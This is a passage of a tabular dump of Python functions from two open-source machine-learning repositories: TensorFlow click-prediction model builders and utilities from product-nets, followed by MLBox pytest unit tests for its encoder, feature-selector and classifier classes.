        b = self.vars['b']
        X_square = tf.SparseTensor(self.X.indices, tf.square(self.X.values), tf.to_int64(tf.shape(self.X)))
        xv = tf.square(tf.sparse_tensor_dense_matmul(self.X, v))
        p = 0.5 * tf.reshape(tf.reduce_sum(xv - tf.sparse_tensor_dense_matmul(X_square, tf.square(v)), 1), [-1, output_dim])
        xw = tf.sparse_tensor_dense_matmul(self.X, w)
        logits = tf.reshape(xw + b + p, [-1])
        self.y_prob = tf.sigmoid(logits)
        self.loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=logits, labels=self.y)) + l2_w * tf.nn.l2_loss(xw) + l2_v * tf.nn.l2_loss(xv)
        self.optimizer = utils.get_optimizer(opt_algo, learning_rate, self.loss)
        config = tf.ConfigProto()
        config.gpu_options.allow_growth = True
        self.sess = tf.Session(config=config)
        tf.global_variables_initializer().run(session=self.sess)"
Atomu2014/product-nets,__init__,"def __init__(self, field_sizes=None, embed_size=10, layer_sizes=None, layer_acts=None, drop_out=None, embed_l2=None, layer_l2=None, init_path=None, opt_algo='gd', learning_rate=0.01, random_seed=None):
    Model.__init__(self)
    init_vars = []
    num_inputs = len(field_sizes)
    for i in range(num_inputs):
        init_vars.append(('embed_%d' % i, [field_sizes[i], embed_size], 'xavier', dtype))
    node_in = num_inputs * embed_size
    for i in range(len(layer_sizes)):
        init_vars.append(('w%d' % i, [node_in, layer_sizes[i]], 'xavier', dtype))
        init_vars.append(('b%d' % i, [layer_sizes[i]], 'zero', dtype))
        node_in = layer_sizes[i]
    self.graph = tf.Graph()
    with self.graph.as_default():
        if random_seed is not None:
            tf.set_random_seed(random_seed)
        self.X = [tf.sparse_placeholder(dtype) for i in range(num_inputs)]
        self.y = tf.placeholder(dtype)
        self.keep_prob_train = 1 - np.array(drop_out)
        self.keep_prob_test = np.ones_like(drop_out)
        self.layer_keeps = tf.placeholder(dtype)
        self.vars = utils.init_var_map(init_vars, init_path)
        w0 = [self.vars['embed_%d' % i] for i in range(num_inputs)]
        xw = tf.concat([tf.sparse_tensor_dense_matmul(self.X[i], w0[i]) for i in range(num_inputs)], 1)
        l = xw
        for i in range(len(layer_sizes)):
            wi = self.vars['w%d' % i]
            bi = self.vars['b%d' % i]
            print(l.shape, wi.shape, bi.shape)
            l = tf.nn.dropout(utils.activate(tf.matmul(l, wi) + bi, layer_acts[i]), self.layer_keeps[i])
        l = tf.squeeze(l)
        self.y_prob = tf.sigmoid(l)
        self.loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=l, labels=self.y))
        if layer_l2 is not None:
            self.loss += embed_l2 * tf.nn.l2_loss(xw)
            for i in range(len(layer_sizes)):
                wi = self.vars['w%d' % i]
                self.loss += layer_l2[i] * tf.nn.l2_loss(wi)
        self.optimizer = utils.get_optimizer(opt_algo, learning_rate, self.loss)
        config = tf.ConfigProto()
        config.gpu_options.allow_growth = True
        self.sess = tf.Session(config=config)
        tf.global_variables_initializer().run(session=self.sess)"
Atomu2014/product-nets,__init__,"def __init__(self, field_sizes=None, embed_size=10, layer_sizes=None, layer_acts=None, drop_out=None, embed_l2=None, layer_l2=None, init_path=None, opt_algo='gd', learning_rate=0.01, random_seed=None):
    Model.__init__(self)
    init_vars = []
    num_inputs = len(field_sizes)
    for i in range(num_inputs):
        init_vars.append(('embed_%d' % i, [field_sizes[i], embed_size], 'xavier', dtype))
        init_vars.append(('weight_%d' % i, [field_sizes[i], 1], 'xavier', dtype))
        init_vars.append(('bias', [1], 'zero', dtype))
    node_in = num_inputs * embed_size
    for i in range(len(layer_sizes)):
        init_vars.append(('w%d' % i, [node_in, layer_sizes[i]], 'xavier', dtype))
        init_vars.append(('b%d' % i, [layer_sizes[i]], 'zero', dtype))
        node_in = layer_sizes[i]
    self.graph = tf.Graph()
    with self.graph.as_default():
        if random_seed is not None:
            tf.set_random_seed(random_seed)
        self.X = [tf.sparse_placeholder(dtype) for i in range(num_inputs)]
        self.y = tf.placeholder(dtype)
        self.keep_prob_train = 1 - np.array(drop_out)
        self.keep_prob_test = np.ones_like(drop_out)
        self.layer_keeps = tf.placeholder(dtype)
        self.vars = utils.init_var_map(init_vars, init_path)
        w = [self.vars['weight_%d' % i] for i in range(num_inputs)]
        v = [self.vars['embed_%d' % i] for i in range(num_inputs)]
        b = self.vars['bias']
        xw = tf.concat([tf.sparse_tensor_dense_matmul(self.X[i], w[i]) for i in range(num_inputs)], 1)
        xv = tf.concat([tf.sparse_tensor_dense_matmul(self.X[i], v[i]) for i in range(num_inputs)], 1)
        l = xv
        for i in range(len(layer_sizes)):
            wi = self.vars['w%d' % i]
            bi = self.vars['b%d' % i]
            print(l.shape, wi.shape, bi.shape)
            l = tf.nn.dropout(utils.activate(tf.matmul(l, wi) + bi, layer_acts[i]), self.layer_keeps[i])
        l = tf.squeeze(l)
        xv = tf.reshape(xv, [-1, num_inputs, embed_size])
        p = 0.5 * tf.reduce_sum(tf.square(tf.reduce_sum(xv, 1)) - tf.reduce_sum(tf.square(xv), 1), 1)
        xw = tf.reduce_sum(xw, 1)
        logits = tf.reshape(l + xw + b + p, [-1])
        self.y_prob = tf.sigmoid(logits)
        self.loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=logits, labels=self.y))
        if layer_l2 is not None:
            self.loss += embed_l2 * tf.nn.l2_loss(xw)
            for i in range(len(layer_sizes)):
                wi = self.vars['w%d' % i]
                self.loss += layer_l2[i] * tf.nn.l2_loss(wi)
        self.optimizer = utils.get_optimizer(opt_algo, learning_rate, self.loss)
        config = tf.ConfigProto()
        config.gpu_options.allow_growth = True
        self.sess = tf.Session(config=config)
        tf.global_variables_initializer().run(session=self.sess)"
Atomu2014/product-nets,__init__,"def __init__(self, field_sizes=None, embed_size=10, filter_sizes=None, layer_acts=None, drop_out=None, init_path=None, opt_algo='gd', learning_rate=0.01, random_seed=None):
    Model.__init__(self)
    init_vars = []
    num_inputs = len(field_sizes)
    for i in range(num_inputs):
        init_vars.append(('embed_%d' % i, [field_sizes[i], embed_size], 'xavier', dtype))
    init_vars.append(('f1', [embed_size, filter_sizes[0], 1, 2], 'xavier', dtype))
    init_vars.append(('f2', [embed_size, filter_sizes[1], 2, 2], 'xavier', dtype))
    init_vars.append(('w1', [2 * 3 * embed_size, 1], 'xavier', dtype))
    init_vars.append(('b1', [1], 'zero', dtype))
    self.graph = tf.Graph()
    with self.graph.as_default():
        if random_seed is not None:
            tf.set_random_seed(random_seed)
        self.X = [tf.sparse_placeholder(dtype) for i in range(num_inputs)]
        self.y = tf.placeholder(dtype)
        self.keep_prob_train = 1 - np.array(drop_out)
        self.keep_prob_test = np.ones_like(drop_out)
        self.layer_keeps = tf.placeholder(dtype)
        self.vars = utils.init_var_map(init_vars, init_path)
        w0 = [self.vars['embed_%d' % i] for i in range(num_inputs)]
        xw = tf.concat([tf.sparse_tensor_dense_matmul(self.X[i], w0[i]) for i in range(num_inputs)], 1)
        l = xw
        l = tf.transpose(tf.reshape(l, [-1, num_inputs, embed_size, 1]), [0, 2, 1, 3])
        f1 = self.vars['f1']
        l = tf.nn.conv2d(l, f1, [1, 1, 1, 1], 'SAME')
        l = tf.transpose(utils.max_pool_4d(tf.transpose(l, [0, 1, 3, 2]), int(num_inputs / 2)), [0, 1, 3, 2])
        f2 = self.vars['f2']
        l = tf.nn.conv2d(l, f2, [1, 1, 1, 1], 'SAME')
        l = tf.transpose(utils.max_pool_4d(tf.transpose(l, [0, 1, 3, 2]), 3), [0, 1, 3, 2])
        l = tf.nn.dropout(utils.activate(tf.reshape(l, [-1, embed_size * 3 * 2]), layer_acts[0]), self.layer_keeps[0])
        w1 = self.vars['w1']
        b1 = self.vars['b1']
        l = tf.matmul(l, w1) + b1
        l = tf.squeeze(l)
        self.y_prob = tf.sigmoid(l)
        self.loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=l, labels=self.y))
        self.optimizer = utils.get_optimizer(opt_algo, learning_rate, self.loss)
        config = tf.ConfigProto()
        config.gpu_options.allow_growth = True
        self.sess = tf.Session(config=config)
        tf.global_variables_initializer().run(session=self.sess)"
Atomu2014/product-nets,__init__,"def __init__(self, field_sizes=None, embed_size=10, layer_sizes=None, layer_acts=None, drop_out=None, embed_l2=None, layer_l2=None, init_path=None, opt_algo='gd', learning_rate=0.01, random_seed=None):
    Model.__init__(self)
    init_vars = []
    num_inputs = len(field_sizes)
    for i in range(num_inputs):
        init_vars.append(('embed_%d' % i, [field_sizes[i], embed_size], 'xavier', dtype))
    num_pairs = int(num_inputs * (num_inputs - 1) / 2)
    node_in = num_inputs * embed_size + num_pairs
    for i in range(len(layer_sizes)):
        init_vars.append(('w%d' % i, [node_in, layer_sizes[i]], 'xavier', dtype))
        init_vars.append(('b%d' % i, [layer_sizes[i]], 'zero', dtype))
        node_in = layer_sizes[i]
    self.graph = tf.Graph()
    with self.graph.as_default():
        if random_seed is not None:
            tf.set_random_seed(random_seed)
        self.X = [tf.sparse_placeholder(dtype) for i in range(num_inputs)]
        self.y = tf.placeholder(dtype)
        self.keep_prob_train = 1 - np.array(drop_out)
        self.keep_prob_test = np.ones_like(drop_out)
        self.layer_keeps = tf.placeholder(dtype)
        self.vars = utils.init_var_map(init_vars, init_path)
        w0 = [self.vars['embed_%d' % i] for i in range(num_inputs)]
        xw = tf.concat([tf.sparse_tensor_dense_matmul(self.X[i], w0[i]) for i in range(num_inputs)], 1)
        xw3d = tf.reshape(xw, [-1, num_inputs, embed_size])
        row = []
        col = []
        for i in range(num_inputs - 1):
            for j in range(i + 1, num_inputs):
                row.append(i)
                col.append(j)
        p = tf.transpose(tf.gather(tf.transpose(xw3d, [1, 0, 2]), row), [1, 0, 2])
        q = tf.transpose(tf.gather(tf.transpose(xw3d, [1, 0, 2]), col), [1, 0, 2])
        p = tf.reshape(p, [-1, num_pairs, embed_size])
        q = tf.reshape(q, [-1, num_pairs, embed_size])
        ip = tf.reshape(tf.reduce_sum(p * q, [-1]), [-1, num_pairs])
        l = tf.concat([xw, ip], 1)
        for i in range(len(layer_sizes)):
            wi = self.vars['w%d' % i]
            bi = self.vars['b%d' % i]
            l = tf.nn.dropout(utils.activate(tf.matmul(l, wi) + bi, layer_acts[i]), self.layer_keeps[i])
        l = tf.squeeze(l)
        self.y_prob = tf.sigmoid(l)
        self.loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=l, labels=self.y))
        if layer_l2 is not None:
            self.loss += embed_l2 * tf.nn.l2_loss(xw)
            for i in range(len(layer_sizes)):
                wi = self.vars['w%d' % i]
                self.loss += layer_l2[i] * tf.nn.l2_loss(wi)
        self.optimizer = utils.get_optimizer(opt_algo, learning_rate, self.loss)
        config = tf.ConfigProto()
        config.gpu_options.allow_growth = True
        self.sess = tf.Session(config=config)
        tf.global_variables_initializer().run(session=self.sess)"
Atomu2014/product-nets,__init__,"def __init__(self, field_sizes=None, embed_size=10, layer_sizes=None, layer_acts=None, drop_out=None, embed_l2=None, layer_l2=None, init_path=None, opt_algo='gd', learning_rate=0.01, random_seed=None, layer_norm=True, kernel_type='mat'):
    Model.__init__(self)
    init_vars = []
    num_inputs = len(field_sizes)
    for i in range(num_inputs):
        init_vars.append(('embed_%d' % i, [field_sizes[i], embed_size], 'xavier', dtype))
    num_pairs = int(num_inputs * (num_inputs - 1) / 2)
    node_in = num_inputs * embed_size + num_pairs
    if kernel_type == 'mat':
        init_vars.append(('kernel', [embed_size, num_pairs, embed_size], 'xavier', dtype))
    elif kernel_type == 'vec':
        init_vars.append(('kernel', [num_pairs, embed_size], 'xavier', dtype))
    elif kernel_type == 'num':
        init_vars.append(('kernel', [num_pairs, 1], 'xavier', dtype))
    for i in range(len(layer_sizes)):
        init_vars.append(('w%d' % i, [node_in, layer_sizes[i]], 'xavier', dtype))
        init_vars.append(('b%d' % i, [layer_sizes[i]], 'zero', dtype))
        node_in = layer_sizes[i]
    self.graph = tf.Graph()
    with self.graph.as_default():
        if random_seed is not None:
            tf.set_random_seed(random_seed)
        self.X = [tf.sparse_placeholder(dtype) for i in range(num_inputs)]
        self.y = tf.placeholder(dtype)
        self.keep_prob_train = 1 - np.array(drop_out)
        self.keep_prob_test = np.ones_like(drop_out)
        self.layer_keeps = tf.placeholder(dtype)
        self.vars = utils.init_var_map(init_vars, init_path)
        w0 = [self.vars['embed_%d' % i] for i in range(num_inputs)]
        xw = tf.concat([tf.sparse_tensor_dense_matmul(self.X[i], w0[i]) for i in range(num_inputs)], 1)
        xw3d = tf.reshape(xw, [-1, num_inputs, embed_size])
        row = []
        col = []
        for i in range(num_inputs - 1):
            for j in range(i + 1, num_inputs):
                row.append(i)
                col.append(j)
        p = tf.transpose(tf.gather(tf.transpose(xw3d, [1, 0, 2]), row), [1, 0, 2])
        q = tf.transpose(tf.gather(tf.transpose(xw3d, [1, 0, 2]), col), [1, 0, 2])
        p = tf.reshape(p, [-1, num_pairs, embed_size])
        q = tf.reshape(q, [-1, num_pairs, embed_size])
        k = self.vars['kernel']
        if kernel_type == 'mat':
            p = tf.expand_dims(p, 1)
            kp = tf.reduce_sum(tf.multiply(tf.transpose(tf.reduce_sum(tf.multiply(p, k), -1), [0, 2, 1]), q), -1)
        else:
            k = tf.expand_dims(k, 0)
            kp = tf.reduce_sum(p * q * k, -1)
        l = tf.concat([xw, kp], 1)
        for i in range(len(layer_sizes)):
            wi = self.vars['w%d' % i]
            bi = self.vars['b%d' % i]
            l = tf.nn.dropout(utils.activate(tf.matmul(l, wi) + bi, layer_acts[i]), self.layer_keeps[i])
        l = tf.squeeze(l)
        self.y_prob = tf.sigmoid(l)
        self.loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=l, labels=self.y))
        if layer_l2 is not None:
            self.loss += embed_l2 * tf.nn.l2_loss(xw)
            for i in range(len(layer_sizes)):
                wi = self.vars['w%d' % i]
                self.loss += layer_l2[i] * tf.nn.l2_loss(wi)
        self.optimizer = utils.get_optimizer(opt_algo, learning_rate, self.loss)
        config = tf.ConfigProto()
        config.gpu_options.allow_growth = True
        self.sess = tf.Session(config=config)
        tf.global_variables_initializer().run(session=self.sess)"
Atomu2014/product-nets,read_data,"def read_data(file_name):
    X = []
    D = []
    y = []
    with open(file_name) as fin:
        for line in fin:
            fields = line.strip().split()
            y_i = int(fields[0])
            X_i = [int(x.split(':')[0]) for x in fields[1:]]
            D_i = [int(x.split(':')[1]) for x in fields[1:]]
            y.append(y_i)
            X.append(X_i)
            D.append(D_i)
    y = np.reshape(np.array(y), [-1])
    X = libsvm_2_coo(zip(X, D), (len(X), INPUT_DIM)).tocsr()
    return (X, y)"
Atomu2014/product-nets,shuffle,"def shuffle(data):
    (X, y) = data
    ind = np.arange(X.shape[0])
    for i in range(7):
        np.random.shuffle(ind)
    return (X[ind], y[ind])"
Atomu2014/product-nets,libsvm_2_coo,"def libsvm_2_coo(libsvm_data, shape):
    coo_rows = []
    coo_cols = []
    coo_data = []
    n = 0
    for (x, d) in libsvm_data:
        coo_rows.extend([n] * len(x))
        coo_cols.extend(x)
        coo_data.extend(d)
        n += 1
    coo_rows = np.array(coo_rows)
    coo_cols = np.array(coo_cols)
    coo_data = np.array(coo_data)
    return coo_matrix((coo_data, (coo_rows, coo_cols)), shape=shape)"
Atomu2014/product-nets,csr_2_input,"def csr_2_input(csr_mat):
    if not isinstance(csr_mat, list):
        coo_mat = csr_mat.tocoo()
        indices = np.vstack((coo_mat.row, coo_mat.col)).transpose()
        values = csr_mat.data
        shape = csr_mat.shape
        return (indices, values, shape)
    else:
        inputs = []
        for csr_i in csr_mat:
            inputs.append(csr_2_input(csr_i))
        return inputs"
Atomu2014/product-nets,slice,"def slice(csr_data, start=0, size=-1):
    if not isinstance(csr_data[0], list):
        if size == -1 or start + size >= csr_data[0].shape[0]:
            slc_data = csr_data[0][start:]
            slc_labels = csr_data[1][start:]
        else:
            slc_data = csr_data[0][start:start + size]
            slc_labels = csr_data[1][start:start + size]
    elif size == -1 or start + size >= csr_data[0][0].shape[0]:
        slc_data = []
        for d_i in csr_data[0]:
            slc_data.append(d_i[start:])
        slc_labels = csr_data[1][start:]
    else:
        slc_data = []
        for d_i in csr_data[0]:
            slc_data.append(d_i[start:start + size])
        slc_labels = csr_data[1][start:start + size]
    return (csr_2_input(slc_data), slc_labels)"
Atomu2014/product-nets,split_data,"def split_data(data, skip_empty=True):
    fields = []
    for i in range(len(FIELD_OFFSETS) - 1):
        start_ind = FIELD_OFFSETS[i]
        end_ind = FIELD_OFFSETS[i + 1]
        if skip_empty and start_ind == end_ind:
            continue
        field_i = data[0][:, start_ind:end_ind]
        fields.append(field_i)
    fields.append(data[0][:, FIELD_OFFSETS[-1]:])
    return (fields, data[1])"
Atomu2014/product-nets,init_var_map,"def init_var_map(init_vars, init_path=None):
    if init_path is not None:
        load_var_map = pkl.load(open(init_path, 'rb'))
        print('load variable map from', init_path, load_var_map.keys())
    var_map = {}
    for (var_name, var_shape, init_method, dtype) in init_vars:
        if init_method == 'zero':
            var_map[var_name] = tf.Variable(tf.zeros(var_shape, dtype=dtype), name=var_name, dtype=dtype)
        elif init_method == 'one':
            var_map[var_name] = tf.Variable(tf.ones(var_shape, dtype=dtype), name=var_name, dtype=dtype)
        elif init_method == 'normal':
            var_map[var_name] = tf.Variable(tf.random_normal(var_shape, mean=0.0, stddev=STDDEV, dtype=dtype), name=var_name, dtype=dtype)
        elif init_method == 'tnormal':
            var_map[var_name] = tf.Variable(tf.truncated_normal(var_shape, mean=0.0, stddev=STDDEV, dtype=dtype), name=var_name, dtype=dtype)
        elif init_method == 'uniform':
            var_map[var_name] = tf.Variable(tf.random_uniform(var_shape, minval=MINVAL, maxval=MAXVAL, dtype=dtype), name=var_name, dtype=dtype)
        elif init_method == 'xavier':
            maxval = np.sqrt(6.0 / np.sum(var_shape))
            minval = -maxval
            var_map[var_name] = tf.Variable(tf.random_uniform(var_shape, minval=minval, maxval=maxval, dtype=dtype), name=var_name, dtype=dtype)
        elif isinstance(init_method, int) or isinstance(init_method, float):
            var_map[var_name] = tf.Variable(tf.ones(var_shape, dtype=dtype) * init_method, name=var_name, dtype=dtype)
        elif init_method in load_var_map:
            if load_var_map[init_method].shape == tuple(var_shape):
                var_map[var_name] = tf.Variable(load_var_map[init_method], name=var_name, dtype=dtype)
            else:
                print('BadParam: init method', init_method, 'shape', var_shape, load_var_map[init_method].shape)
        else:
            print('BadParam: init method', init_method)
    return var_map"
Atomu2014/product-nets,activate,"def activate(weights, activation_function):
    if activation_function == 'sigmoid':
        return tf.nn.sigmoid(weights)
    elif activation_function == 'softmax':
        return tf.nn.softmax(weights)
    elif activation_function == 'relu':
        return tf.nn.relu(weights)
    elif activation_function == 'tanh':
        return tf.nn.tanh(weights)
    elif activation_function == 'elu':
        return tf.nn.elu(weights)
    elif activation_function == 'none':
        return weights
    else:
        return weights"
Atomu2014/product-nets,get_optimizer,"def get_optimizer(opt_algo, learning_rate, loss):
    if opt_algo == 'adaldeta':
        return tf.train.AdadeltaOptimizer(learning_rate).minimize(loss)
    elif opt_algo == 'adagrad':
        return tf.train.AdagradOptimizer(learning_rate).minimize(loss)
    elif opt_algo == 'adam':
        return tf.train.AdamOptimizer(learning_rate).minimize(loss)
    elif opt_algo == 'ftrl':
        return tf.train.FtrlOptimizer(learning_rate).minimize(loss)
    elif opt_algo == 'gd':
        return tf.train.GradientDescentOptimizer(learning_rate).minimize(loss)
    elif opt_algo == 'padagrad':
        return tf.train.ProximalAdagradOptimizer(learning_rate).minimize(loss)
    elif opt_algo == 'pgd':
        return tf.train.ProximalGradientDescentOptimizer(learning_rate).minimize(loss)
    elif opt_algo == 'rmsprop':
        return tf.train.RMSPropOptimizer(learning_rate).minimize(loss)
    else:
        return tf.train.GradientDescentOptimizer(learning_rate).minimize(loss)"
Atomu2014/product-nets,gather_2d,"def gather_2d(params, indices):
    shape = tf.shape(params)
    flat = tf.reshape(params, [-1])
    flat_idx = indices[:, 0] * shape[1] + indices[:, 1]
    flat_idx = tf.reshape(flat_idx, [-1])
    return tf.gather(flat, flat_idx)"
Atomu2014/product-nets,gather_3d,"def gather_3d(params, indices):
    shape = tf.shape(params)
    flat = tf.reshape(params, [-1])
    flat_idx = indices[:, 0] * shape[1] * shape[2] + indices[:, 1] * shape[2] + indices[:, 2]
    flat_idx = tf.reshape(flat_idx, [-1])
    return tf.gather(flat, flat_idx)"
Atomu2014/product-nets,gather_4d,"def gather_4d(params, indices):
    shape = tf.shape(params)
    flat = tf.reshape(params, [-1])
    flat_idx = indices[:, 0] * shape[1] * shape[2] * shape[3] + indices[:, 1] * shape[2] * shape[3] + indices[:, 2] * shape[3] + indices[:, 3]
    flat_idx = tf.reshape(flat_idx, [-1])
    return tf.gather(flat, flat_idx)"
Atomu2014/product-nets,max_pool_2d,"def max_pool_2d(params, k):
    (_, indices) = tf.nn.top_k(params, k, sorted=False)
    shape = tf.shape(indices)
    r1 = tf.reshape(tf.range(shape[0]), [-1, 1])
    r1 = tf.tile(r1, [1, k])
    r1 = tf.reshape(r1, [-1, 1])
    indices = tf.concat([r1, tf.reshape(indices, [-1, 1])], 1)
    return tf.reshape(gather_2d(params, indices), [-1, k])"
Atomu2014/product-nets,max_pool_3d,"def max_pool_3d(params, k):
    (_, indices) = tf.nn.top_k(params, k, sorted=False)
    shape = tf.shape(indices)
    r1 = tf.reshape(tf.range(shape[0]), [-1, 1])
    r2 = tf.reshape(tf.range(shape[1]), [-1, 1])
    r1 = tf.tile(r1, [1, k * shape[1]])
    r2 = tf.tile(r2, [1, k])
    r1 = tf.reshape(r1, [-1, 1])
    r2 = tf.tile(tf.reshape(r2, [-1, 1]), [shape[0], 1])
    indices = tf.concat([r1, r2, tf.reshape(indices, [-1, 1])], 1)
    return tf.reshape(gather_3d(params, indices), [-1, shape[1], k])"
Atomu2014/product-nets,max_pool_4d,"def max_pool_4d(params, k):
    (_, indices) = tf.nn.top_k(params, k, sorted=False)
    shape = tf.shape(indices)
    r1 = tf.reshape(tf.range(shape[0]), [-1, 1])
    r2 = tf.reshape(tf.range(shape[1]), [-1, 1])
    r3 = tf.reshape(tf.range(shape[2]), [-1, 1])
    r1 = tf.tile(r1, [1, shape[1] * shape[2] * k])
    r2 = tf.tile(r2, [1, shape[2] * k])
    r3 = tf.tile(r3, [1, k])
    r1 = tf.reshape(r1, [-1, 1])
    r2 = tf.tile(tf.reshape(r2, [-1, 1]), [shape[0], 1])
    r3 = tf.tile(tf.reshape(r3, [-1, 1]), [shape[0] * shape[1], 1])
    indices = tf.concat([r1, r2, r3, tf.reshape(indices, [-1, 1])], 1)
    return tf.reshape(gather_4d(params, indices), [-1, shape[1], shape[2], k])"
AxeldeRomblay/MLBox,__getattr__,"@classmethod
def __getattr__(cls, name):
    return MagicMock()"
AxeldeRomblay/MLBox,test_init_encoder,"def test_init_encoder():
    """"""Test init method of Categorical_encoder class.""""""
    encoder = Categorical_encoder()
    assert encoder.strategy == 'label_encoding'
    assert not encoder.verbose
    assert encoder._Categorical_encoder__Lcat == []
    assert encoder._Categorical_encoder__Lnum == []
    assert encoder._Categorical_encoder__Enc == dict()
    assert encoder._Categorical_encoder__K == dict()
    assert not encoder._Categorical_encoder__weights
    assert not encoder._Categorical_encoder__fitOK"
AxeldeRomblay/MLBox,test_get_params_encoder,"def test_get_params_encoder():
    """"""Test get_params method of Categorical_encoder class.""""""
    encoder = Categorical_encoder()
    dict = {'strategy': 'label_encoding', 'verbose': False}
    assert encoder.get_params() == dict"
AxeldeRomblay/MLBox,test_set_params_encoder,"def test_set_params_encoder():
    """"""Test set_params method of Categorical_encoder class.""""""
    encoder = Categorical_encoder()
    encoder.set_params(strategy='label_encoding')
    assert encoder.strategy == 'label_encoding'
    encoder.set_params(strategy='dummification')
    assert encoder.strategy == 'dummification'
    encoder.set_params(strategy='random_projection')
    assert encoder.strategy == 'random_projection'
    encoder.set_params(strategy='entity_embedding')
    assert encoder.strategy == 'entity_embedding'
    encoder.set_params(verbose=True)
    assert encoder.verbose
    encoder.set_params(verbose=False)
    assert not encoder.verbose
    with pytest.warns(UserWarning) as record:
        encoder.set_params(_Categorical_encoder__Lcat=[])
    assert len(record) == 1"
AxeldeRomblay/MLBox,test_fit_encoder,"def test_fit_encoder():
    """"""Test method fit of Categorical_encoder class.""""""
    df = pd.read_csv('data_for_tests/train.csv')
    encoder = Categorical_encoder(strategy='wrong_strategy')
    with pytest.raises(ValueError):
        encoder.fit(df, df['Survived'])
    encoder.set_params(strategy='label_encoding')
    encoder.fit(df, df['Survived'])
    assert encoder._Categorical_encoder__fitOK
    encoder.set_params(strategy='dummification')
    encoder.fit(df, df['Survived'])
    assert encoder._Categorical_encoder__fitOK
    encoder.set_params(strategy='random_projection')
    encoder.fit(df, df['Survived'])
    assert encoder._Categorical_encoder__fitOK
    encoder.set_params(strategy='entity_embedding')
    encoder.fit(df, df['Survived'])
    assert encoder._Categorical_encoder__fitOK"
AxeldeRomblay/MLBox,test_transform_encoder,"def test_transform_encoder():
    """"""Test transform method of Categorical_encoder class.""""""
    df = pd.read_csv('data_for_tests/train.csv')
    encoder = Categorical_encoder()
    with pytest.raises(ValueError):
        encoder.transform(df)
    encoder.fit(df, df['Survived'])
    df_encoded = encoder.transform(df)
    assert (df.columns == df_encoded.columns).all()
    encoder.set_params(strategy='dummification')
    encoder.fit(df, df['Survived'])
    df_encoded = encoder.transform(df)
    assert (type(df_encoded) == pd.SparseDataFrame) | (type(df_encoded) == pd.DataFrame)
    encoder.set_params(strategy='random_projection')
    encoder.fit(df, df['Survived'])
    df_encoded = encoder.transform(df)
    assert type(df_encoded) == pd.DataFrame
    encoder.set_params(strategy='entity_embedding')
    encoder.fit(df, df['Survived'])
    df_encoded = encoder.transform(df)
    assert type(df_encoded) == pd.DataFrame"
AxeldeRomblay/MLBox,test_init_Clf_feature_selector,"def test_init_Clf_feature_selector():
    """"""Test init method of Clf_feature_selector class.""""""
    feature_selector = Clf_feature_selector()
    assert feature_selector.strategy == 'l1'
    assert feature_selector.threshold == 0.3
    assert not feature_selector._Clf_feature_selector__fitOK
    assert feature_selector._Clf_feature_selector__to_discard == []"
AxeldeRomblay/MLBox,test_get_params_Clf_feature_selector,"def test_get_params_Clf_feature_selector():
    """"""Test get_params method of Clf_feature_selector class.""""""
    feature_selector = Clf_feature_selector()
    dict = {'strategy': 'l1', 'threshold': 0.3}
    assert feature_selector.get_params() == dict"
AxeldeRomblay/MLBox,test_set_params_Clf_feature_selector,"def test_set_params_Clf_feature_selector():
    """"""Test set_params method of Clf_feature_selector class.""""""
    feature_selector = Clf_feature_selector()
    feature_selector.set_params(strategy='variance')
    assert feature_selector.strategy == 'variance'
    feature_selector.set_params(threshold=0.2)
    assert feature_selector.threshold == 0.2
    with pytest.warns(UserWarning) as record:
        feature_selector.set_params(wrong_strategy='wrong_strategy')
    assert len(record) == 1"
AxeldeRomblay/MLBox,test_fit_Clf_feature_selector,"def test_fit_Clf_feature_selector():
    """"""Test fit method of Clf_feature_selector class.""""""
    feature_selector = Clf_feature_selector()
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    with pytest.raises(ValueError):
        feature_selector.fit(None, y_train)
    with pytest.raises(ValueError):
        feature_selector.fit(df_train, None)
    feature_selector.fit(df_train, y_train)
    assert feature_selector._Clf_feature_selector__fitOK
    feature_selector.set_params(strategy='variance')
    feature_selector.fit(df_train, y_train)
    assert feature_selector._Clf_feature_selector__fitOK
    feature_selector.set_params(strategy='rf_feature_importance')
    feature_selector.fit(df_train, y_train)
    assert feature_selector._Clf_feature_selector__fitOK
    feature_selector.set_params(strategy='wrond_strategy')
    with pytest.raises(ValueError):
        feature_selector.fit(df_train, y_train)"
AxeldeRomblay/MLBox,test_transform_Clf_feature_selector,"def test_transform_Clf_feature_selector():
    """"""Test transform method of Clf_feature_selector class.""""""
    feature_selector = Clf_feature_selector(threshold=0)
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    with pytest.raises(ValueError):
        feature_selector.transform(df_train)
    feature_selector.fit(df_train, y_train)
    with pytest.raises(ValueError):
        feature_selector.transform(None)
    df_transformed = feature_selector.transform(df_train)
    assert (df_transformed.columns == df_train.columns).all()"
AxeldeRomblay/MLBox,test_fit_transform_Clf_feature_selector,"def test_fit_transform_Clf_feature_selector():
    """"""Test fit_transform method of Clf_feature_selector class.""""""
    feature_selector = Clf_feature_selector(threshold=0)
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    df_transformed = feature_selector.fit_transform(df_train, y_train)
    assert (df_transformed.columns == df_train.columns).all()"
AxeldeRomblay/MLBox,test_init_classifier,"def test_init_classifier():
    """"""Test init method of Classifier class.""""""
    classifier = Classifier()
    assert classifier._Classifier__strategy == 'LightGBM'
    assert classifier._Classifier__classif_params == {}
    assert classifier._Classifier__classifier
    assert not classifier._Classifier__col
    assert not classifier._Classifier__fitOK"
AxeldeRomblay/MLBox,test_get_params_classifier,"def test_get_params_classifier():
    """"""Test get_params method of Classifier class.""""""
    classifier = Classifier()
    params = classifier.get_params()
    assert params == {'strategy': 'LightGBM'}
    assert not classifier._Classifier__classif_params"
AxeldeRomblay/MLBox,test_set_params_classifier,"def test_set_params_classifier():
    """"""Test set_params method of Classifier class.""""""
    classifier = Classifier()
    classifier.set_params(strategy='LightGBM')
    assert classifier._Classifier__strategy == 'LightGBM'
    classifier.set_params(strategy='RandomForest')
    assert classifier._Classifier__strategy == 'RandomForest'
    classifier.set_params(strategy='ExtraTrees')
